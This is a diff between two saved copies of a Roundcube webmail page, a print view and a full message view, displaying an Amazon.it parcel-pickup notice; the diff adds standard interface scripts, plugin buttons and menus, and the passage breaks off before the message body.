@@ -1,15 +1,26 @@
 <!DOCTYPE html>
-<!-- saved from url=(0099)https://webmail.eu.com/roundcube/?_task=mail&_safe=1&_uid=13894&_mbox=INBOX&_action=print&_extwin=1 -->
+<!-- saved from url=(0093)https://webmail.eu.com/roundcube/?_task=mail&_action=show&_uid=13909&_mbox=INBOX&_format=html -->
 <html lang="en" class=" js chrome webkit"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
-<title>Roundcube Webmail :: Il tuo pacco è pronto per il ritiro presso Punto Poste TABACCHERIA n. 11. Ricorda di ritirarlo entro 3 gennaio</title>
+<title>Roundcube Webmail :: Il tuo pacco è pronto per il ritiro presso Punto Poste TABACCHERIA n. 11. Ricorda di ritirarlo entro 7 gennaio</title>
+<meta name="viewport" content="" id="viewport">
+
 <link rel="shortcut icon" href="https://webmail.eu.com/roundcube/skins/larry/images/favicon.ico?s=1606987059">
 
-<link rel="stylesheet" type="text/css" href="./qwe_files/print.min.css">
+<link rel="stylesheet" type="text/css" href="./qwe_files/styles.min.css">
+<link rel="stylesheet" type="text/css" href="./qwe_files/mail.min.css">
+<link rel="stylesheet" type="text/css" href="./qwe_files/managesieve_mail.min.css">
+<link rel="stylesheet" type="text/css" href="./qwe_files/markasjunk.min.css">
 <link rel="stylesheet" type="text/css" href="./qwe_files/jquery-ui.css">
+<script src="./qwe_files/ui.min.js"></script>
+
+
+
+
 <script src="./qwe_files/jquery.min.js"></script>
 <script src="./qwe_files/common.min.js"></script>
 <script src="./qwe_files/app.min.js"></script>
+<script src="./qwe_files/treelist.min.js"></script>
 <script>
 /*
         @licstart  The following is the entire license notice for the 
@@ -30,38 +41,268 @@
         for the JavaScript code in this page.
 */
 var rcmail = new rcube_webmail();
-rcmail.set_env({"task":"mail","standard_windows":false,"locale":"en_US","devel_mode":null,"rcversion":10409,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"skin":"larry","extwin":1,"blankpage":"skins/larry/watermark.html","refresh_interval":60,"session_lifetime":600,"action":"print","comm_path":"./?_task=mail","user_id":"5775e75fc7e3c9e4dcd87f5a301a35a4","compose_extwin":false,"allow_save_device_30days":true,"twofactor_formfield_as_password":false,"date_format":"yy-mm-dd","date_format_localized":"YYYY-MM-DD","browser_capabilities":{"pdf":"1","flash":"0","tiff":"0","webp":"1"},"uid":"13894","safemode":true,"message_context":null,"message_flags":["seen"],"sender":"\"Amazon.it\" \u003Corder-update@amazon.it\u003E","mailbox":"INBOX","username":"christophe.thiebaud@aequologica.net","permaurl":"./?_task=mail&_action=show&_uid=13894&_mbox=INBOX","has_writeable_addressbook":true,"delimiter":"/","mimetypes":["text/plain","text/html","image/jpeg","image/gif","image/png","image/bmp","image/webp","application/x-javascript","application/pdf","message/rfc822"],"read_when_deleted":true,"display_next":true,"drafts_mailbox":"Drafts","trash_mailbox":"Trash","junk_mailbox":"Junk","optional_format":"text","request_token":"gs0VXj1yksS1qUIDyMsG1YgRePoDa4sC"});
-rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","windowopenerror":"The popup window was blocked!","uploadingmany":"Uploading files...","uploading":"Uploading file...","close":"Close","save":"Save","cancel":"Cancel","alerttitle":"Attention","confirmationtitle":"Are you sure...","delete":"Delete","continue":"Continue","ok":"OK","twofactor_gauthenticator.activate":"Activate","twofactor_gauthenticator.twofactor_gauthenticator":"2-Factor Authentication","twofactor_gauthenticator.code":"Google Authenticator Code","twofactor_gauthenticator.two_step_verification_form":"2-Factor Authentication Code:","twofactor_gauthenticator.secret":"Secret","twofactor_gauthenticator.qr_code":"QR Code","twofactor_gauthenticator.msg_infor":"You can scan this QR code containing the 2-Factor settings using a TOTP compatible app such as \u003Ca href=\"https://github.com/google/google-authenticator\" target=\"_blank\"\u003Egoogle-authenticator\u003C/a\u003E","twofactor_gauthenticator.show_secret":"Show secret","twofactor_gauthenticator.hide_secret":"Hide secret","twofactor_gauthenticator.create_secret":"Create secret","twofactor_gauthenticator.show_qr_code":"Show QR Code","twofactor_gauthenticator.hide_qr_code":"Hide QR Code","twofactor_gauthenticator.recovery_codes":"Recovery codes","twofactor_gauthenticator.show_recovery_codes":"Show recovery codes","twofactor_gauthenticator.hide_recovery_codes":"Hide recovery codes","twofactor_gauthenticator.setup_all_fields":"Fill all fields (make sure you click save to store your settings)","twofactor_gauthenticator.enrollment_dialog_title":"2-Factor authentication enrollment","twofactor_gauthenticator.enrollment_dialog_msg":"\u003Cstrong\u003E2-Factor authentication codes\u003C/strong\u003E are required for increased security, please configure them now.","twofactor_gauthenticator.check_code":"Check code","twofactor_gauthenticator.code_ok":"Code OK","twofactor_gauthenticator.code_ko":"Incorrect code","twofactor_gauthenticator.dont_ask_me_30days":"Don&#39;t ask me codes again on this computer for 30 days","twofactor_gauthenticator.check_code_to_activate":"To save, please scan the QR Code and enter the current 2-Factor code below.","twofactor_gauthenticator.successfully_saved":"2-Factor authentication settings saved successfully.","checkingmail":"Checking for new messages...","deletemessage":"Delete message","movemessagetotrash":"Move message to trash","movingmessage":"Moving message(s)...","deletingmessage":"Deleting message(s)...","markingmessage":"Marking message(s)...","replyall":"Reply all","replylist":"Reply list","bounce":"Resend","bouncemsg":"Resend (bounce)","sendingmessage":"Sending message..."});
+rcmail.set_env({"task":"mail","standard_windows":false,"locale":"en_US","devel_mode":null,"rcversion":10409,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"skin":"larry","blankpage":"skins/larry/watermark.html","refresh_interval":60,"session_lifetime":600,"action":"show","comm_path":"./?_task=mail","user_id":"5775e75fc7e3c9e4dcd87f5a301a35a4","compose_extwin":false,"markasjunk_ham_mailbox":"INBOX","markasjunk_spam_mailbox":"Junk","markasjunk_move_spam":false,"markasjunk_move_ham":false,"markasjunk_permanently_remove":false,"markasjunk_spam_only":false,"allow_save_device_30days":true,"twofactor_formfield_as_password":false,"date_format":"yy-mm-dd","date_format_localized":"YYYY-MM-DD","browser_capabilities":{"pdf":"1","flash":"0","tiff":"0","webp":"1"},"uid":"13909","safemode":false,"message_context":null,"message_flags":["seen"],"sender":"\"Amazon.it\" \u003Corder-update@amazon.it\u003E","mailbox":"INBOX","username":"christophe.thiebaud@aequologica.net","permaurl":"./?_task=mail&_action=show&_uid=13909&_mbox=INBOX","has_writeable_addressbook":true,"delimiter":"/","mimetypes":["text/plain","text/html","image/jpeg","image/gif","image/png","image/bmp","image/webp","application/x-javascript","application/pdf","message/rfc822"],"read_when_deleted":true,"display_next":true,"drafts_mailbox":"Drafts","trash_mailbox":"Trash","junk_mailbox":"Junk","optional_format":"text","sieve_headers":[["Subject","Il tuo pacco è pronto per il ritiro presso Punto Poste TABACCHERIA n. 11. Ricorda di ritirarlo entro 7 gennaio"],["From","order-update@amazon.it"],["To","christophe.thiebaud@alumni.insead.edu"]],"unreadwrap":"%s","collapsed_folders":"","mailboxes":{"INBOX":{"id":"INBOX","name":"Inbox","virtual":false,"class":"inbox"},"Drafts":{"id":"Drafts","name":"Drafts","virtual":false,"class":"drafts"},"Sent":{"id":"Sent","name":"Sent","virtual":false,"class":"sent"},"Junk":{"id":"Junk","name":"Junk","virtual":false,"class":"junk"},"Trash":{"id":"Trash","name":"Trash","virtual":false,"class":"trash"},"N26":{"id":"N26","name":"N26","virtual":false},"Perso":{"id":"Perso","name":"Perso","virtual":false}},"mailboxes_list":["INBOX","Drafts","Sent","Junk","Trash","N26","Perso"],"blockedobjects":true,"request_token":"ALn0MdZCnFVybvCwJvoJ9vhR2hzIoLdB"});
+rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","windowopenerror":"The popup window was blocked!","uploadingmany":"Uploading files...","uploading":"Uploading file...","close":"Close","save":"Save","cancel":"Cancel","alerttitle":"Attention","confirmationtitle":"Are you sure...","delete":"Delete","continue":"Continue","ok":"OK","managesieve.newfilter":"New filter","managesieve.usedata":"Use following data in the filter:","managesieve.nodata":"At least one position must be selected!","managesieve.nextstep":"Next Step","markasjunk.buttonjunk":"This message is junk","markasjunk.asjunk":"As junk","markasjunk.markasjunk":"Mark as junk","markasjunk.buttonnotjunk":"This message is not junk","markasjunk.asnotjunk":"As not junk","markasjunk.markasnotjunk":"Mark as not junk","markasjunk.notjunk":"Not junk","markasjunk.reportedasjunk":"Successfully reported as junk","markasjunk.reportedasnotjunk":"Successfully reported as not junk","twofactor_gauthenticator.activate":"Activate","twofactor_gauthenticator.twofactor_gauthenticator":"2-Factor Authentication","twofactor_gauthenticator.code":"Google Authenticator Code","twofactor_gauthenticator.two_step_verification_form":"2-Factor Authentication Code:","twofactor_gauthenticator.secret":"Secret","twofactor_gauthenticator.qr_code":"QR Code","twofactor_gauthenticator.msg_infor":"You can scan this QR code containing the 2-Factor settings using a TOTP compatible app such as \u003Ca href=\"https://github.com/google/google-authenticator\" target=\"_blank\"\u003Egoogle-authenticator\u003C/a\u003E","twofactor_gauthenticator.show_secret":"Show secret","twofactor_gauthenticator.hide_secret":"Hide secret","twofactor_gauthenticator.create_secret":"Create secret","twofactor_gauthenticator.show_qr_code":"Show QR Code","twofactor_gauthenticator.hide_qr_code":"Hide QR Code","twofactor_gauthenticator.recovery_codes":"Recovery codes","twofactor_gauthenticator.show_recovery_codes":"Show recovery codes","twofactor_gauthenticator.hide_recovery_codes":"Hide recovery codes","twofactor_gauthenticator.setup_all_fields":"Fill all fields (make sure you click save to store your settings)","twofactor_gauthenticator.enrollment_dialog_title":"2-Factor authentication enrollment","twofactor_gauthenticator.enrollment_dialog_msg":"\u003Cstrong\u003E2-Factor authentication codes\u003C/strong\u003E are required for increased security, please configure them now.","twofactor_gauthenticator.check_code":"Check code","twofactor_gauthenticator.code_ok":"Code OK","twofactor_gauthenticator.code_ko":"Incorrect code","twofactor_gauthenticator.dont_ask_me_30days":"Don&#39;t ask me codes again on this computer for 30 days","twofactor_gauthenticator.check_code_to_activate":"To save, please scan the QR Code and enter the current 2-Factor code below.","twofactor_gauthenticator.successfully_saved":"2-Factor authentication settings saved successfully.","checkingmail":"Checking for new messages...","deletemessage":"Delete message","movemessagetotrash":"Move message to trash","movingmessage":"Moving message(s)...","deletingmessage":"Deleting message(s)...","markingmessage":"Marking message(s)...","replyall":"Reply all","replylist":"Reply list","bounce":"Resend","bouncemsg":"Resend (bounce)","sendingmessage":"Sending message...","errortitle":"An error occurred!","toggleadvancedoptions":"Toggle advanced options","options":"Options","purgefolderconfirm":"Do you really want to delete all messages in this folder?","deletemessagesconfirm":"Do you really want to delete selected message(s)?"});
+rcmail.gui_container("topline-left","topline-left");
+rcmail.gui_container("topline-center","topline-center");
+rcmail.gui_container("topline-right","topline-right");
+rcmail.gui_container("taskbar","taskbar");
+rcmail.gui_container("toolbar","mailtoolbar");
+rcmail.gui_container("forwardmenu","forwardmenu-menu");
+rcmail.gui_container("replyallmenu","replyallmenu-menu");
+rcmail.gui_container("messagemenu","messagemenu-menu");
+rcmail.gui_container("markmenu","markmessagemenu-menu");
+rcmail.gui_container("attachmentmenu","attachmentoptionsmenu");rcmail.register_button('managesieve-create', 'rcmbtn100', 'link', 'icon filterlink active', '', '');
+rcmail.register_button('plugin.markasjunk.junk', 'rcmbtn101', 'link', 'button junk', 'button junk pressed', '');
+rcmail.register_button('plugin.markasjunk.not_junk', 'rcmbtn102', 'link', 'button notjunk', 'button notjunk pressed', '');
+rcmail.register_button('logout', 'rcmbtn104', 'link', '', '', '');
+rcmail.register_button('mail', 'rcmbtn105', 'link', '', 'button-mail button-selected', '');
+rcmail.register_button('addressbook', 'rcmbtn106', 'link', '', 'button-addressbook button-selected', '');
+rcmail.register_button('settings', 'rcmbtn107', 'link', '', 'button-settings button-selected', '');
+rcmail.register_button('logout', 'rcmbtn108', 'link', '', 'button-logout', '');
+rcmail.register_button('list', 'rcmbtn109', 'link', 'button back', 'button back pressed', '');
+rcmail.register_button('compose', 'rcmbtn110', 'link', 'button compose', 'button compose pressed', '');
+rcmail.register_button('reply', 'rcmbtn111', 'link', 'button reply', 'button reply pressed', '');
+rcmail.register_button('reply-all', 'rcmbtn112', 'link', 'button reply-all', 'button reply-all pressed', '');
+rcmail.register_button('forward', 'rcmbtn113', 'link', 'button forward', 'button forward pressed', '');
+rcmail.register_button('delete', 'rcmbtn114', 'link', 'button delete', 'button delete pressed', '');
+rcmail.register_button('move', 'rcmbtn115', 'link', 'button move', 'button move pressed', '');
+rcmail.register_button('print', 'rcmbtn116', 'link', 'button print', 'button print pressed', '');
+rcmail.register_button('forward-inline', 'rcmbtn117', 'link', 'forwardlink active', '', '');
+rcmail.register_button('forward-attachment', 'rcmbtn118', 'link', 'forwardattachmentlink active', '', '');
+rcmail.register_button('bounce', 'rcmbtn119', 'link', 'bouncelink active', '', '');
+rcmail.register_button('reply-all', 'rcmbtn120', 'link', 'replyalllink active', '', '');
+rcmail.register_button('reply-list', 'rcmbtn121', 'link', 'replylistlink active', '', '');
+rcmail.register_button('print', 'rcmbtn122', 'link', 'icon active', '', '');
+rcmail.register_button('download', 'rcmbtn123', 'link', 'icon active', '', '');
+rcmail.register_button('edit', 'rcmbtn124', 'link', 'icon active', '', '');
+rcmail.register_button('viewsource', 'rcmbtn125', 'link', 'icon active', '', '');
+rcmail.register_button('move', 'rcmbtn126', 'link', 'icon active', '', '');
+rcmail.register_button('copy', 'rcmbtn127', 'link', 'icon active', '', '');
+rcmail.register_button('open', 'rcmbtn128', 'link', 'icon active', '', '');
+rcmail.register_button('mark', 'rcmbtn129', 'link', 'icon active', '', '');
+rcmail.register_button('mark', 'rcmbtn130', 'link', 'icon active', '', '');
+rcmail.register_button('mark', 'rcmbtn131', 'link', 'icon active', '', '');
+rcmail.register_button('mark', 'rcmbtn132', 'link', 'icon active', '', '');
+rcmail.gui_object('mailboxlist', 'mailboxlist');
+rcmail.gui_object('countdisplay', 'rcmcountdisplay');
+rcmail.register_button('previousmessage', 'rcmbtn133', 'link', 'button prevpage', 'button prevpage pressed', '');
+rcmail.register_button('nextmessage', 'rcmbtn134', 'link', 'button nextpage', 'button nextpage pressed', '');
+rcmail.register_button('change-format', 'rcmbtn135', 'link', '', '', '');
+rcmail.register_button('change-format', 'rcmbtn136', 'link', '', 'button last changeformat text pressed', '');
+rcmail.gui_object('all_headers_row', 'all-headers');
+rcmail.gui_object('all_headers_box', 'headers-source');
+rcmail.gui_object('remoteobjectsmsg', 'remote-objects-message');
+rcmail.register_button('open-attachment', 'attachmenuopen', 'link', 'icon active', '', '');
+rcmail.register_button('download-attachment', 'attachmenudownload', 'link', 'icon active', '', '');
+rcmail.gui_object('message', 'messagestack');
 </script>
 
+<script src="./qwe_files/managesieve.min.js"></script>
+<script src="./qwe_files/markasjunk.min.js"></script>
 <script src="./qwe_files/twofactor_gauthenticator.js"></script>
 <script src="./qwe_files/qrcode.min.js"></script>
 <script src="./qwe_files/jquery-ui.min.js"></script>
 
 </head>
-<body>
+<body class="noscroll">
+<script>
+var UI = new rcube_mail_ui();
+</script>
 
-<div id="header"><img src="./qwe_files/roundcube_logo.png" id="toplogo" border="0" alt="Logo"></div>
+<div id="header">
+<div id="topline" role="banner" aria-labelledby="aria-label-topnav">
+	<h2 id="aria-label-topnav" class="voice">Window control</h2>
+	<div class="topleft">
+		
+					<a class="about-link" onclick="UI.show_about(this);return false" id="rcmbtn103" role="button" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#">About</a>
+					</div>
+	
+	<div class="topright">
+	
+			<span class="username">christophe.thiebaud@aequologica.net</span>
+		<a class="button-logout" id="rcmbtn104" role="button" href="https://webmail.eu.com/roundcube/?_task=logout" onclick="return rcmail.command(&#39;switch-task&#39;,&#39;logout&#39;,this,event)" tabindex="0" aria-disabled="false">Logout</a>
+	
+	</div>
+</div>
+<div id="topnav">
+	<h2 id="aria-label-tasknav" class="voice">Application tasks</h2>
+	<div id="taskbar" class="topright" role="navigation" aria-labelledby="aria-label-tasknav">
+		<a class="button-mail button-selected" id="rcmbtn105" role="button" href="https://webmail.eu.com/roundcube/?_task=mail" onclick="return rcmail.command(&#39;switch-task&#39;,&#39;mail&#39;,this,event)" tabindex="-1" aria-disabled="true"><span class="button-inner">Mail</span><span class="tooltip">Mail</span></a>
+		<a class="button-addressbook" id="rcmbtn106" role="button" href="https://webmail.eu.com/roundcube/?_task=addressbook" onclick="return rcmail.command(&#39;switch-task&#39;,&#39;addressbook&#39;,this,event)" tabindex="0" aria-disabled="false"><span class="button-inner">Contacts</span><span class="tooltip">Contacts</span></a>
+		
+		<a class="button-settings" id="rcmbtn107" role="button" href="https://webmail.eu.com/roundcube/?_task=settings" onclick="return rcmail.command(&#39;switch-task&#39;,&#39;settings&#39;,this,event)" tabindex="0" aria-disabled="false"><span class="button-inner">Settings</span><span class="tooltip">Settings</span></a>
+		<a class="button-logout" id="rcmbtn108" role="button" href="https://webmail.eu.com/roundcube/?_task=logout" onclick="return rcmail.command(&#39;switch-task&#39;,&#39;logout&#39;,this,event)" tabindex="0" aria-disabled="false"><span class="button-inner">Logout</span><span class="tooltip">Logout</span></a>
+		<span class="minmodetoggle" role="presentation"></span>
+	</div>
+	<img src="./qwe_files/roundcube_logo.png" id="toplogo" alt="Logo" onclick="if(window.rcmail)rcmail.command(&#39;switch-task&#39;,&#39;mail&#39;)">
+</div>
 
-<div id="printmessageframe">
-<table class="headers-table"><tbody><tr><td class="header-title">Subject</td>
-<td class="header subject">Il tuo pacco è pronto per il ritiro presso Punto Poste TABACCHERIA n. 11. Ricorda di ritirarlo entro 3 gennaio</td>
-</tr>
-<tr><td class="header-title">From</td>
-<td class="header from"><span class="adr">Amazon.it &lt;order-update@amazon.it&gt;</span></td>
+<br style="clear:both">
+</div>
+
+
+<div id="mainscreen">
+
+<h1 class="voice">Il tuo pacco è pronto per il ritiro presso Punto Poste TABACCHERIA n. 11. Ricorda di ritirarlo entro 7 gennaio</h1>
+
+<!-- toolbar -->
+<h2 id="aria-label-toolbar" class="voice">Application toolbar</h2>
+<div id="messagetoolbar" class="toolbar fullwidth" role="toolbar" aria-labelledby="aria-label-toolbar">
+	<a class="button back" id="rcmbtn109" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=list" onclick="return rcmail.command(&#39;list&#39;,&#39;&#39;,this,event)">Back</a>
+	<a class="button compose" title="Create a new message" id="rcmbtn110" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=compose" onclick="return rcmail.command(&#39;compose&#39;,&#39;&#39;,this,event)">Compose</a>
+<span class="spacer"></span>
+<a class="button reply" title="Reply to sender" id="rcmbtn111" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;reply&#39;,&#39;&#39;,this,event)">Reply</a>
+<span class="dropbutton">
+	<a class="button reply-all" title="Reply to list or to sender and all recipients" id="rcmbtn112" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;reply-all&#39;,&#39;&#39;,this,event)">Reply all</a>
+	<a href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#reply-all" class="dropbuttontip" id="replyallmenulink" onclick="UI.toggle_popup(&#39;replyallmenu&#39;,event);return false" aria-haspopup="true" aria-expanded="false" aria-owns="replyallmenu-menu" tabindex="0">Reply-all options</a>
+</span>
+<span class="dropbutton">
+	<a class="button forward" title="Forward the message" id="rcmbtn113" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;forward&#39;,&#39;&#39;,this,event)">Forward</a>
+	<a href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#forward" class="dropbuttontip" id="forwardmenulink" onclick="UI.toggle_popup(&#39;forwardmenu&#39;,event);return false" aria-haspopup="true" aria-expanded="false" aria-owns="forwardmenu-menu" tabindex="0">Forwarding options</a>
+</span>
+<a class="button delete" title="Move message to trash" id="rcmbtn114" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;delete&#39;,&#39;&#39;,this,event)">Delete</a>
+<a class="button move" title="Move to..." data-menu-pos="bottom" id="rcmbtn115" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;move&#39;,&#39;&#39;,this,event)">Move</a>
+<a class="button print" title="Print this message" id="rcmbtn116" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;print&#39;,&#39;&#39;,this,event)">Print</a>
+
+<a class="button notjunk" title="This message is not junk" id="rcmbtn102" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;plugin.markasjunk.not_junk&#39;,&#39;&#39;,this,event)" style="display: none;"><span class="inner">Not junk</span></a><a class="button junk" title="This message is junk" id="rcmbtn101" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;plugin.markasjunk.junk&#39;,&#39;&#39;,this,event)"><span class="inner">Junk</span></a>
+
+<a id="markmessagemenulink" class="button markmessage" title="Mark messages" onclick="UI.toggle_popup(&#39;markmessagemenu&#39;,event);return false" aria-haspopup="true" aria-expanded="false" aria-owns="markmessagemenu-menu" role="button" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#">Mark</a>
+<a id="messagemenulink" class="button more" title="More actions..." onclick="UI.toggle_popup(&#39;messagemenu&#39;,event);return false" aria-haspopup="true" aria-expanded="false" aria-owns="messagemenu-menu" role="button" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#">More</a>
+
+<div id="forwardmenu" class="popupmenu" aria-hidden="true">
+	<h3 id="aria-label-forwardmenu" class="voice">Forwarding options</h3>
+	<ul id="forwardmenu-menu" class="toolbarmenu" role="menu" aria-labelledby="aria-label-forwardmenu">
+		<li role="menuitem"><a class="forwardlink active" id="rcmbtn117" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;forward-inline&#39;,&#39;sub&#39;,this,event)">Forward inline</a></li>
+		<li role="menuitem"><a class="forwardattachmentlink active" id="rcmbtn118" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;forward-attachment&#39;,&#39;sub&#39;,this,event)">Forward as attachment</a></li>
+		<li role="menuitem"><a class="bouncelink active" id="rcmbtn119" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;bounce&#39;,&#39;sub&#39;,this,event)">Resend (bounce)</a></li>
+		
+	</ul>
+</div>
+
+<div id="replyallmenu" class="popupmenu" aria-hidden="true">
+	<h3 id="aria-label-replyallmenu" class="voice">Reply-all options</h3>
+	<ul id="replyallmenu-menu" class="toolbarmenu" role="menu" aria-labelledby="aria-label-replyallmenu">
+		<li role="menuitem"><a class="replyalllink active" id="rcmbtn120" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;reply-all&#39;,&#39;sub&#39;,this,event)">Reply all</a></li>
+		<li role="menuitem"><a class="replylistlink" id="rcmbtn121" role="button" tabindex="-1" aria-disabled="true" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;reply-list&#39;,&#39;sub&#39;,this,event)">Reply list</a></li>
+		
+	</ul>
+</div>
+
+<div id="messagemenu" class="popupmenu" aria-hidden="true">
+	<h3 id="aria-label-messagemenu" class="voice">More message actions</h3>
+	<ul id="messagemenu-menu" class="toolbarmenu iconized" role="menu" aria-labelledby="aria-label-messagemenu">
+		<li role="menuitem"><a class="icon active" id="rcmbtn122" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;print&#39;,&#39;&#39;,this,event)"><span class="icon print">Print this message</span></a></li>
+		<li role="menuitem"><a class="icon active" id="rcmbtn123" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;download&#39;,&#39;&#39;,this,event)"><span class="icon download">Download (.eml)</span></a></li>
+		<li role="menuitem"><a class="icon active" id="rcmbtn124" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;edit&#39;,&#39;new&#39;,this,event)"><span class="icon edit">Edit as new</span></a></li>
+		<li role="menuitem"><a class="icon active" id="rcmbtn125" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;viewsource&#39;,&#39;&#39;,this,event)"><span class="icon viewsource">Show source</span></a></li>
+		<li role="menuitem"><a class="icon active" id="rcmbtn126" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;move&#39;,&#39;&#39;,this,event)"><span class="icon move folder-selector-link">Move to...</span></a></li>
+		<li role="menuitem"><a class="icon active" id="rcmbtn127" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;copy&#39;,&#39;&#39;,this,event)"><span class="icon copy folder-selector-link">Copy to...</span></a></li>
+		<li role="menuitem"><a target="_blank" class="icon active" id="rcmbtn128" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;open&#39;,&#39;&#39;,this,event)"><span class="icon extwin">Open in new window</span></a></li>
+		<li role="menuitem"><a class="icon filterlink active" id="rcmbtn100" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;managesieve-create&#39;,&#39;&#39;,this,event)"><span class="icon filterlink">Create filter</span></a></li>
+
+	</ul>
+</div>
+
+<div id="markmessagemenu" class="popupmenu" aria-hidden="true">
+	<h3 id="aria-label-markmessagemenu" class="voice">Mark selected messages as...</h3>
+	<ul id="markmessagemenu-menu" class="toolbarmenu iconized" role="menu" aria-labelledby="aria-label-markmessagemenu">
+		<li role="menuitem"><a class="icon active" id="rcmbtn129" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;mark&#39;,&#39;read&#39;,this,event)"><span class="icon read">As read</span></a></li>
+		<li role="menuitem"><a class="icon active" id="rcmbtn130" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;mark&#39;,&#39;unread&#39;,this,event)"><span class="icon unread">As unread</span></a></li>
+		<li role="menuitem"><a class="icon active" id="rcmbtn131" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;mark&#39;,&#39;flagged&#39;,this,event)"><span class="icon flagged">As flagged</span></a></li>
